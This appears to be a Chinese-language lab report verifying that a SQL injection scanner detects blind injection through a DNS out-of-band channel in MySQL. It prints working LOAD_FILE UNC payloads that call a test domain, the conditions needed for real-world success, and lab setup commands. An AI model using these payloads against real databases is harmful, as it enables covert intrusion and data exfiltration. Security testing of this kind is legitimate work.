# DNS OOB 带外通道真机验证报告

**日期**：2026-09-11
**环境**：Windows 10/11 本机实验（等价「目标主机可对外发 DNS、攻击者持有权威 NS」拓扑）

## 结论

✅ **DNS OOB 引擎级全链路命中**：引擎生成 payload → 真 MySQL 8.0.28 执行 `LOAD_FILE` UNC 解析 → Windows 系统解析器（NRPT 路由 `.ooblab.test`）→ 自建 DNS 接收端（127.0.0.1:53）捕获 token → 检出 `oob` 漏洞，evidence 明确标注「DNS 通道」。

## 验证分层（自底向上，各层独立闭环）

| 层 | 验证脚本 | 结果 |
|---|---|---|
| ① 接收端 DNS 解析/过滤 | `dns-probe.mjs` | 5/5 PASS（自构 A 查询、真实 nslookup、错域过滤、`_` 前缀过滤、仅 A/AAAA） |
| ② 系统解析器 NRPT 路由 | `diag-nrpt-resolve.mjs` | `ping sysresolv01.ooblab.test` 被接收端捕获 ✅ |
| ③ 真 MySQL UNC → DNS | `manual-mysql-unc.mjs` | `SELECT LOAD_FILE(CONCAT(0x5c5c,'mysqlunc99.ooblab.test',0x5c78))` 返回 null 但接收端捕获 token ✅ |
| ④ 引擎级全链路 | `dns-engine-verify.mjs` | 检出 1 个 `oob` 漏洞，DNS 通道证据命中 ✅ |

## 引擎级检出证据（results/dns-oob-engine-report.json）

- technique: `oob`，dbms: `MySQL`，risk: Medium
- payload: `user1' AND LOAD_FILE(CONCAT(0x5c5c,'s0CsuwPxjfsIIgrD.ooblab.test',0x5c78))-- -`
- evidence: token `s0CsuwPxjfsIIgrD` 的 DNS 查询被接收端捕获（无回显注入成立）

## 实战前提（三要素，缺一不可）

1. **MySQL `secure_file_priv` 非 NULL**：默认 NULL 时 LOAD_FILE 在约束检查即返回，连 DNS 都不发起（经验测试⑥已证实）。DBA 放行场景（`--secure-file-priv=` 空值或指定目录含 UNC 路径语义）才可达。
2. **目标主机可对外发 DNS 且解析路径可达攻击者 NS**：内网全隔离或 NS 不可达则通道失效。
3. **Windows 测试域用 `.test` TLD**：`.local` 被 mDNS 保留，单播 NRPT 不生效。

## 本机实验拓扑还原（复现步骤）

1. 提权添加 NRPT 规则：`Add-DnsClientNrptRule -Namespace ".ooblab.test" -NameServers "127.0.0.1"`（等价攻击者权威 NS 指向接收端）
2. 启动 MySQL 3307：`--secure-file-priv=` 放行 LOAD_FILE
3. `node e2e/oob-real-lab/mysql-lab-app.mjs`（无回显靶场，/oob?name= 字符串上下文，WAF 拦 sleep/报错/union）
4. `node e2e/oob-real-lab/dns-engine-verify.mjs`：启动接收端（dnsDomain=ooblab.test, dnsPort=53）→ 引擎 `techniques:['oob'], dbms:'MySQL', oob.dnsOob:true` → 判定

## 排障过程记录（对复现有价值）

- `nslookup -port=` 在单次查询模式被 Windows 忽略（双端口旁路监听证实），接收端实战形态监听默认 53
- NRPT 添加需提权（普通会话 WIN32 5 权限拒绝），`Start-Process powershell -Verb RunAs` 成功
- 引擎级首跑 0 检出根因是**靶场 bug 而非引擎问题**：靶场 SQL 用 `WHERE name=` 但 sqli_lab.users 表实际列是 `username`，payload 到达但 LOAD_FILE 未执行；诊断日志（打印到达的 name 值与 SQL 错误）定位后改列名即命中

## 诚实边界

- SQL Server `xp_dirtree` / Oracle `UTL_HTTP` 等其它库的 DNS/HTTP OOB 模板未真机验证
- 真实 ModSecurity / 商业云 WAF 环境未实测（本机 WAF 为模拟拦截）
- PostgreSQL DNS 模板池为空（设计内：PG 走 HTTP 回连通道 `COPY TO PROGRAM`，已另行真机验证）

## 环境清理备忘

- NRPT 规则 `.ooblab.test` / `.oob-lab.local` 需**提权**移除：`Remove-DnsClientNrptRule -Namespace ".ooblab.test"`
- MySQL 3307 当前以 `--secure-file-priv=` 放行模式运行，属实验配置，勿带入生产口径
